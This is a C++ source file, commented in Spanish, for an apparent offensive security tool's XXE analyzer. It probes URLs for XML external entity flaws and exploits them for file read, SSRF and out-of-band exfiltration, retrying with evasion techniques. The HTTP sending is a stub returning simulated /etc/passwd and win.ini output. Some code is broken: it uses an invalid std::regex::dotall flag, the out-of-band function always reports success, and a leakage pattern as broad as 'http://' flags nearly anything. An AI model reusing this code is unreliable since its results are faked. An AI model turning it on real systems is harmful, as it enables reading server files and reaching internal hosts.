/**
 * XxeAnalyzer.cpp
 * Implementación de la clase para analizar vulnerabilidades XXE (XML External Entity)
 */

#include "XxeAnalyzer.h"
#include <regex>
#include <iostream>
#include <sstream>

namespace BlackWidow {
namespace Security {
namespace Analyzer {

XxeAnalyzer::XxeAnalyzer() : exfiltrationServer("http://localhost:8080") {
    // Constructor por defecto
}

XxeAnalysisResult XxeAnalyzer::analyzeResponse(const std::string& response, const std::string& payload) {
    XxeAnalysisResult result;
    
    // Verificar si la respuesta contiene información filtrada
    if (detectDataLeakage(response)) {
        result.vulnerable = true;
        result.evidence = response;
        result.payload = payload;
        
        // Determinar el tipo de vulnerabilidad basado en el payload
        if (payload.find("file:") != std::string::npos) {
            result.vulnerabilityType = "File Read";
        } else if (payload.find("http:") != std::string::npos) {
            result.vulnerabilityType = "SSRF";
        } else {
            result.vulnerabilityType = "XXE Generic";
        }
        
        // Extraer datos filtrados
        result.extractedData = extractLeakedData(response);
    }
    
    return result;
}

XxeAnalysisResult XxeAnalyzer::detectVulnerability(const std::string& url, 
                                                 const std::map<std::string, std::string>& headers) {
    XxeAnalysisResult result;
    
    // Probar con payloads básicos
    std::vector<std::string> basicPayloads = Payloads::XxePayloads::getBasicPayloads();
    
    for (const auto& payload : basicPayloads) {
        std::string response = sendXxeRequest(url, payload, headers);
        XxeAnalysisResult tempResult = analyzeResponse(response, payload);
        
        if (tempResult.vulnerable) {
            return tempResult; // Retornar al primer indicio de vulnerabilidad
        }
    }
    
    // Si no se encontró vulnerabilidad con payloads básicos, probar con avanzados
    std::vector<std::string> advancedPayloads = Payloads::XxePayloads::getAdvancedPayloads();
    
    for (const auto& payload : advancedPayloads) {
        std::string response = sendXxeRequest(url, payload, headers);
        XxeAnalysisResult tempResult = analyzeResponse(response, payload);
        
        if (tempResult.vulnerable) {
            return tempResult;
        }
    }
    
    // Probar con payloads específicos para lectura de archivos
    std::vector<std::string> fileReadPayloads = 
        Payloads::XxePayloads::getAttackSpecificPayloads(Payloads::XxeAttackType::FILE_READ);
    
    for (const auto& payload : fileReadPayloads) {
        std::string response = sendXxeRequest(url, payload, headers);
        XxeAnalysisResult tempResult = analyzeResponse(response, payload);
        
        if (tempResult.vulnerable) {
            return tempResult;
        }
    }
    
    return result; // No se encontró vulnerabilidad
}

XxeAnalysisResult XxeAnalyzer::exploitFileRead(const std::string& url, const std::string& filePath, 
                                             const std::map<std::string, std::string>& headers) {
    XxeAnalysisResult result;
    
    // Generar payload específico para leer el archivo
    std::string payload = Payloads::XxePayloads::generateFileReadPayload(filePath);
    
    // Intentar con el payload normal
    std::string response = sendXxeRequest(url, payload, headers);
    result = analyzeResponse(response, payload);
    
    // Si no funciona, intentar con técnicas de evasión
    if (!result.vulnerable) {
        std::string evasionPayload = Payloads::XxePayloads::applyEvasionTechniques(payload);
        response = sendXxeRequest(url, evasionPayload, headers);
        result = analyzeResponse(response, evasionPayload);
    }
    
    return result;
}

XxeAnalysisResult XxeAnalyzer::exploitSsrf(const std::string& url, const std::string& internalUrl,
                                         const std::map<std::string, std::string>& headers) {
    XxeAnalysisResult result;
    
    // Generar payload específico para SSRF
    std::string payload = Payloads::XxePayloads::generateSsrfPayload(internalUrl);
    
    // Intentar con el payload normal
    std::string response = sendXxeRequest(url, payload, headers);
    result = analyzeResponse(response, payload);
    
    // Si no funciona, intentar con técnicas de evasión
    if (!result.vulnerable) {
        std::string evasionPayload = Payloads::XxePayloads::applyEvasionTechniques(payload);
        response = sendXxeRequest(url, evasionPayload, headers);
        result = analyzeResponse(response, evasionPayload);
    }
    
    return result;
}

void XxeAnalyzer::setExfiltrationServer(const std::string& serverUrl) {
    exfiltrationServer = serverUrl;
}

XxeAnalysisResult XxeAnalyzer::exploitOobExfiltration(const std::string& url, const std::string& filePath,
                                                    const std::map<std::string, std::string>& headers) {
    XxeAnalysisResult result;
    
    // Generar payload para exfiltración OOB
    std::string payload = Payloads::XxePayloads::generateOobExfiltrationPayload(exfiltrationServer, filePath);
    
    // Enviar la petición con el payload
    std::string response = sendXxeRequest(url, payload, headers);
    
    // Para ataques OOB, la respuesta puede no contener la información filtrada
    // ya que se envía al servidor de exfiltración
    result.vulnerable = true; // Asumimos que es vulnerable si no hay errores
    result.vulnerabilityType = "Out-of-Band XXE";
    result.evidence = "Datos enviados al servidor de exfiltración: " + exfiltrationServer;
    result.payload = payload;
    
    // Nota: En una implementación real, aquí se verificaría si el servidor de exfiltración
    // recibió los datos. Para esta implementación, asumimos que sí.
    
    return result;
}

std::string XxeAnalyzer::sendXxeRequest(const std::string& url, const std::string& payload,
                                      const std::map<std::string, std::string>& headers) {
    // Nota: En una implementación real, aquí se enviaría una petición HTTP
    // con el payload XXE al URL especificado. Para esta implementación,
    // simplemente devolvemos un placeholder.
    
    std::ostringstream responseStream;
    responseStream << "HTTP/1.1 200 OK\r\n";
    responseStream << "Content-Type: text/xml\r\n\r\n";
    
    // Simulamos una respuesta basada en el payload
    if (payload.find("file:///etc/passwd") != std::string::npos) {
        responseStream << "<response>root:x:0:0:root:/root:/bin/bash\n";
        responseStream << "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n";
        responseStream << "bin:x:2:2:bin:/bin:/usr/sbin/nologin</response>";
    } else if (payload.find("file:///c:/windows/win.ini") != std::string::npos) {
        responseStream << "<response>[fonts]\nfont=tahoma\n";
        responseStream << "[extensions]\n";
        responseStream << "[mci extensions]</response>";
    } else if (payload.find("http://internal-server") != std::string::npos) {
        responseStream << "<response>Internal server data</response>";
    } else {
        responseStream << "<response>No data leaked</response>";
    }
    
    return responseStream.str();
}

bool XxeAnalyzer::detectDataLeakage(const std::string& response) {
    // Patrones que podrían indicar filtración de datos mediante XXE
    std::vector<std::string> leakagePatterns = {
        "root:x:",                // Contenido de /etc/passwd
        "[fonts]",               // Contenido de win.ini
        "[extensions]",          // Contenido de win.ini
        "Internal server data",  // Respuesta de servidor interno
        "<?xml",                 // Contenido XML filtrado
        "<!DOCTYPE",             // Declaración DOCTYPE filtrada
        "file://",               // URL de archivo filtrada
        "http://",               // URL HTTP filtrada
    };
    
    for (const auto& pattern : leakagePatterns) {
        if (response.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

std::map<std::string, std::string> XxeAnalyzer::extractLeakedData(const std::string& response) {
    std::map<std::string, std::string> extractedData;
    
    // Extraer contenido entre etiquetas <response></response>
    std::regex responseRegex("<response>(.*?)</response>", std::regex::dotall);
    std::smatch matches;
    
    if (std::regex_search(response, matches, responseRegex) && matches.size() > 1) {
        std::string content = matches[1].str();
        
        // Detectar tipo de contenido filtrado
        if (content.find("root:x:") != std::string::npos) {
            extractedData["file_type"] = "/etc/passwd";
            extractedData["content"] = content;
        } else if (content.find("[fonts]") != std::string::npos) {
            extractedData["file_type"] = "win.ini";
            extractedData["content"] = content;
        } else if (content.find("Internal server data") != std::string::npos) {
            extractedData["server_type"] = "internal";
            extractedData["content"] = content;
        } else {
            extractedData["unknown_data"] = content;
        }
    }
    
    return extractedData;
}

} // namespace Analyzer
} // namespace Security
} // namespace BlackWidow